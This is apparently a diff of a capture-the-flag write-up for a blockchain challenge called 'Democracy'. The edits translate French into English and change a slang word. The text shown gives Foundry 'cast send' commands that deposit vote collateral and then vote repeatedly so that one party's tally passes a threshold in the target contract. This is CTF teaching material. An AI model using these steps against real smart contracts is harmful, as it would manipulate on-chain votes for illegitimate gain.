@@ -2,7 +2,7 @@
 > Easy
 >In the post-apocalyptic wasteland, the remnants of human and machine factions vie for control over the last vestiges of civilization. The Automata Liberation Front (ALF) and the Cyborgs Independence Movement (CIM) are the two primary parties seeking to establish dominance. In this harsh and desolate world, democracy has taken a backseat, and power is conveyed by wealth. Will you be able to bring back some Democracy in this hopeless land?
 
-On doit faire en sorte qu'un certain parti politique gagne et que ses votes atteignent 1000 * 10^18 (notons que 10^18 wei = 1ether).
+We have to make a political "CIM" win by raising setting its votes above 1000 * 10^18 votes (we can notice that 10^18 wei = 1ether).
 
 # Recon
 
@@ -33,7 +33,7 @@ in commands it looks like this:
 
 `cast send $TARGET -r $RPC_URL --from $ATTACKER --private-key $PRIVATE_KEY "depositVoteCollateral(string,string)" Sato shiNakamoto`
 
-- We vote for our favorite party 10 times: `cast send $TARGET --private-key $PRIVATE_KEY -r $RPC_URL "vote(bytes3,string,string)" 0x43494d Sato shiNakamoto` (execute the command 1 time like a golmon, we're not scripting here)
+- We vote for our favorite party 10 times: `cast send $TARGET --private-key $PRIVATE_KEY -r $RPC_URL "vote(bytes3,string,string)" 0x43494d Sato shiNakamoto` (execute the command 1 time like a clueless man, we're not scripting here)
 
 - You can check the number of votes with `cast call $TARGET -r $RPC_URL "getVotesCount(bytes3)" 0x43494d`.
 
